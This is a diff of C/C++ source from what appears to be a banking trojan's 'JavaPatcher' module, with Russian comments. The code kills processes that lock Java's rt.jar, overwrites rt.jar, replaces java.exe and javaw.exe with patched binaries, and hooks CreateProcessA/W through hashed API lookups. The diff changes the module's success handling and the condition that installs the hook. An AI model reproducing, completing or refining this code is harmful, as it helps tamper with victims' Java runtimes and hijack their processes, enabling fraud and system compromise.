@@ -706,7 +706,7 @@ static void GetFileName(HANDLE hFile, PCHAR TheName)
 
  
 
-static int FindBlockingProcesses( char* FileName, ULONG* PIDs, int c_PIDs )
+static int FindBlockingProcesses( const char* FileName, ULONG* PIDs, int c_PIDs )
 {
 	PSYSTEM_HANDLE_INFORMATION Info;
 	ULONG                      r;
@@ -762,7 +762,7 @@ static void KillBlockingProcesses( const char* fileName )
 
 	int counter = 0; //счетчик попыток уничтожения процессов
 	int countProcess;
-	while( ( countProcess = FindBlockingProcesses( "\\lib\\rt.jar", PIDS, 10 ) ) && counter < 3 )
+	while( ( countProcess = FindBlockingProcesses( fileName, PIDS, 10 ) ) && counter < 3 )
 	{
 		counter++;
 		while( countProcess-- )
@@ -1014,14 +1014,14 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 			if( pCopyFileA( srcFile, dstFile, FALSE ) ) 
 			{
 				DBG( "JavaPatcher", "copy %s -> %s OK", srcFile, dstFile );
-				res = true;
 			}
 			else
 			{
 				DBG( "JavaPatcher", "copy %s -> %s ERROR", srcFile, dstFile );
 				resPatch = 3; //не скопировался rt.jar
-				//pMoveFileExA( srcFile, dstFile, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );
+				//pMoveFileExA( srcFile, dstFile, MOVEFILE_REPLACE_EXISTING | MOVEFILE_DELAY_UNTIL_REBOOT );			
 			}
+			res = true;
 			//Подменяем яву
 			res &= ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str() );
 			res &= ReplacementExe( "javaw.exe", Patched_Jawaw_Name, javaExew.str() );
@@ -1392,7 +1392,7 @@ bool SetJavaPatcherHook()
 	}
 	DBG( "JavaPatcher", "resPatcher = %d", resPatcher );
 	bool ret = false;
-	if( resPatcher > 1 ) 
+	if( resPatcher > 1 && resPatcher != 3 ) 
 	{
 		if (!HookApi( DLL_KERNEL32, 0x46318AC7, &HookCreateProcessA, &RealCreateProcA ) ) return false;
 		if (!HookApi( DLL_KERNEL32, 0x46318AD1, &HookCreateProcessW, &RealCreateProcW ) ) return false;
